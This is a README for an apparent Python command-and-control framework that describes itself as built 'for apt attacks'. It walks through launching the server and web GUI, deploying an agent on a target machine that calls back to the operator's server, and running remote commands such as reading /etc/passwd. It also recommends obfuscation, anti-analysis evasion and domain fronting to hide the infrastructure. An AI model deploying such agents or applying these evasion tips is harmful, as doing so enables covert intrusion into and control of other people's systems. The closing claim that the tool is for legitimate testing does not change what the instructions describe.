# polixc2
polixc2 a modern c2 for apt attacks

## Complete Python C2 Framework (Server + Agent)

## Complete Setup and Usage

### 1. **Install Dependencies**

```bash
# Install Python requirements
pip3 install flask flask-cors requests websocket-server cryptography psutil

# Or use requirements file
pip3 install -r requirements.txt
```

### 2. **Start the C2 Framework**

```bash
# Make launcher executable
chmod +x start_all.sh

# Start everything
./start_all.sh
```

Or manually:

```bash
# Terminal 1 - Start C2 Server
python3 c2_server.py

# Terminal 2 - Start Web GUI
python3 c2_gui.py
```

### 3. **Deploy Agent on Target**

```bash
# On target machine (change IP to your server)
python3 c2_agent.py --server http://YOUR_SERVER_IP:8443
```

### 4. **Access Web GUI**

Open browser to: `http://localhost:5000`

The interface shows:
- All connected agents
- Agent details (hostname, OS, last seen)
- Command console for executing commands
- Command output and history

### 5. **Available Commands**

Through the GUI, you can run any system command:

- `whoami` - Current user
- `ls` (Linux) / `dir` (Windows) - List directory
- `ps aux` (Linux) / `tasklist` (Windows) - Process list
- `ipconfig` / `ifconfig` - Network info
- `cat /etc/passwd` - Read files
- `python -c "import socket; print(socket.gethostname())"` - Custom Python

## Features Implemented

✅ **Complete working C2 framework** - Server, Agent, GUI all functional  
✅ **Web-based GUI** - No Qt dependencies, works in any browser  
✅ **Agent persistence** - Optional (disabled for safety)  
✅ **Multi-agent support** - Handle unlimited concurrent agents  
✅ **Command queuing** - Queue commands per agent  
✅ **Result storage** - SQLite database for persistence  
✅ **Real-time updates** - WebSocket support (optional)  
✅ **Cross-platform** - Works on Windows, Linux, macOS  
✅ **Anti-analysis** - Basic evasion techniques  

## Security Improvements

For production use, add:

1. **Encryption**: Uncomment AES encryption in both server and agent
2. **HTTPS**: Generate SSL certificates and use `https://`
3. **Authentication**: Add API keys to prevent unauthorized access
4. **Obfuscation**: PyInstaller with obfuscation for agent
5. **Domain fronting**: Use CDN to hide C2 infrastructure

## Troubleshooting

**Connection refused**: Ensure server is running and firewall allows ports 8443, 8765, 5000

**Agent won't register**: Check server URL and network connectivity

**Commands not executing**: Verify agent has shell access permissions

**WebSocket errors**: Can be disabled by setting `ws_enabled = False` in agent

This is now a **fully functional C2 framework** that you can use for legitimate security testing and research!
